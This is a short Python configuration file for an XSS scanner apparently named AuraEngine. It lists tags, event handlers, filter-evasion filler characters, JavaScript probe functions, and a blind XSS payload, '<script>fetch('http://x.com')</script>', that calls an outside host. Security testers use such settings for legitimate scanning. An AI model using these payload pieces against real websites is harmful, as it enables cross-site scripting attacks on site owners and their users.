import os

# AuraEngine Configuration
# Used by refactored AuraEngine components

# Path to definitions file
db_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'db')
definitions_file = os.path.join(db_path, 'definitions.json')

# Core Data Structures for AuraEngine logic
xsschecker = "xssstriker_probe"
badTags = ["script", "iframe", "embed", "object", "base", "meta", "style", "canvas", "video", "audio"]
fillings = ["%00", "%0d", "%0a", "%09", "/", " "]
eFillings = ["%00", "%0d", "%0a", "%09", "/", " "]
lFillings = ["%00", "%0d", "%0a", "%09", "/", " "]
jFillings = ["%00", "%0d", "%0a", "%09"]
eventHandlers = ["onload", "onerror", "onmouseover", "onclick", "onfocus"]
tags = ["svg", "img", "body", "video", "details", "a"]
functions = ["alert(1)", "prompt(1)", "confirm(1)"]

# Other global settings
blind_payload = "<script>fetch('http://x.com')</script>"
timeout = 10
delay = 0
thread_count = 10
headers = {"User-Agent": "Mozilla/5.0"}
proxy = None
path = ""
method = "GET"
params = {}
jsonData = False
interactive = False
verbose = False
